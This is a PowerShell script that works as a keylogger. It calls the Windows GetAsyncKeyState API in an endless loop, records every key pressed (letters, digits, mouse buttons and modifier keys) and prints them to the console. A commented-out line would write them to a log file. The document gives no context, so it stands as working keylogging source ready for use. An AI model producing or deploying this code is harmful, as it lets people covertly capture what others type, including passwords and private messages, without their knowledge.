$Signature = @'
    [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
    public static extern short GetAsyncKeyState(int virtualKeyCode); 
'@
Add-Type -MemberDefinition $Signature -Name Keyboard -Namespace PsOneApi
do
{
	for ($i = 0; $i -le 255; $i = $i + 1)
	{
		$keynum = [byte]$i
		if ( [bool]([PsOneApi.Keyboard]::GetAsyncKeyState($keynum) -eq -32767))
		{
			switch ($keynum) {
				1 { $outkey = "LMB" }
				2 { $outkey = "RMB" }
				8 { $outkey = "BACK" }
				9 { $outkey = "TAB" }
				13 { $outkey = "ENTER" }
				16 { continue } # SHIFT
				17 { continue } # CTRL
				18 { continue } # ALT
				20 { $outkey = "CAPS" }
				27 { $outkey = "ESC" }
				32 { $outkey = "SPACE" }
				33 { $outkey = "Page_Down" }
				34 { $outkey = "Page_UP" }
				36 { $outkey = "HOME" }
				91 { $outkey = "WIN" }
				160 { $outkey = "LSHIFT" } # for shift
				161 { $outkey = "RSHIFT" } # for shift
				162 { $outkey = "LCTRL" } # for CTRL
				163 { $outkey = "RCTRL" } # for CTRL
				164 { $outkey = "LALT" } # for ALT
				187 { $outkey = "=" }
				189 { $outkey = "-" }
				219 { $outkey = "[" }
				221 { $outkey = "]" }
				220 { $outkey = "\" }
			}
			if (($keynum -ge 48 -and $keynum -le 57) -or ($keynum -ge 65 -and $keynum -le 90)) { $outkey = [char]$keynum }
			
			if ([bool]$outkey -eq $false){
				$outkey = "UNK-${keynum}"
			}
		Write-Host -NoNewLine "${outkey}:"
		#$outkey | Out-File -Append -NoNewLine -FilePath ".\log.txt" 
			
			$outkey = ""
			
		}
	}
} while($true)
